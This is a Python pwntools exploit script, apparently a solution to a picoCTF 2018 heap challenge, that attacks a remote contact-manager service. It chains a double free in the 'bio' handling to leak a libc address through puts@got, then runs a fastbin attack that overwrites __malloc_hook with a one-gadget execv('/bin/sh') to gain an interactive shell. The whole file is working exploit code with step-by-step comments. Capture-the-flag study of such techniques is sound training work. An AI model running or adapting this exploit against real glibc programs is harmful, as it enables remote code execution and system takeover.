#!/bin/python2
from pwn import *
import re

context.terminal = ["termite", "-e"]

def alloc(p, c):
    p.sendline("create " + c)
    return c

def free(p, c):
    p.sendline("delete " + c)

def bio(p, c, b, l):
    p.sendline("bio " + c)
    p.sendlineafter("How long will the bio be?", str(int(l)))
    p.sendline(b)

#set bio bug, if size is 3 characters then bio must be right after length
def lbio(p, c, b, l):
    p.sendline("bio " + c)
    p.sendline(str(int(l))+b)

# can free bio any amount of times by forcing it to exit early
def free_bio(p, c):
    p.sendline("bio " + c)
    #max character is 255, so exit early by doing over that
    p.sendline("256")

def display(p, c):
    p.sendline("display")

def leak(p, c):
    p.sendline("display")
    l = p.recvline_contains(c + " -")
    bio = l.split('- ')[-1]
    bio = struct.unpack("L", bio + "\x00"*2)
    if p.can_recv():
        p.recv()
    return int(bio[0])


def break_heap():
    p = remote('2018shell1.picoctf.com', 56667)
    puts = struct.pack("L", 0x602020)
    A = alloc(p, "user")
    # Put &puts@got.plt into heap with padding to make size of user struct
    bio(p, A, "A"*8+puts, 16)
    free_bio(p, A) #fastbin->top now has value of &puts@got
    # B gets fastbin top
    B = alloc(p, "user2") # No initializer, now B->bio is &puts@got
    libc = leak(p, B) - 0x6f690 # leaks puts@got and subtract offset for base
    og = libc + 0x4526a
    m_hk = libc + 0x3C4B10
    log.info('libc base: ' + hex(libc))
    log.info('one gadget: ' + hex(og))
    log.info('__malloc_hook: ' + hex(m_hk))

    # Fastbin attack
    # setting up
    # (we can only control malloc size for bio, so precreate as many contacts as needed)
    A = alloc(p, "A")
    B = alloc(p, "B")
    C = alloc(p, "C")
    D = alloc(p, "D")
    E = alloc(p, "E")
    F = alloc(p, "F")

    # we can __malloc_chunk-0x23 as fake header, which would give a size of 0x7f
    fchunk = m_hk-0x23
    log.info('Corrupting fastchunk list with fake chunk at: ' + hex(fchunk))
    # malloc(0x60) creates size of 0x70 (0x71 with inuse), which is in the same bin as 0x7f
    msize = 0x60
    lbio(p, A, "A"*msize, msize) # alloc fastbin
    lbio(p, B, "B"*msize, msize) # alloc fastbin

    free_bio(p, B) # B->next is NULL B is top of fastbin
    free_bio(p, A) # A->next is NULL A is top of fastbin
    # double free B
    free_bio(p, B) # B->next = A B is top of fastbin

    # Fastbin returns B, overwrite B->next with fake chunk pointing above __malloc_hook
    lbio(p, C, " "+struct.pack("L", fchunk), msize)
    # Returns A
    bio(p, D, "", msize)
    # Returns B
    bio(p, E, "", msize)
    # Returns B->next or fake chunk above malloc hook
    # Overwrite __malloc_hook with one gadget of execv("/bin/sh")
    bio(p, F, "\x00"*0x13+struct.pack("L", og), msize)
    # This next call to malloc will invoke the function pointer __malloc_hook
    alloc(p, "win")

    p.interactive()

break_heap()
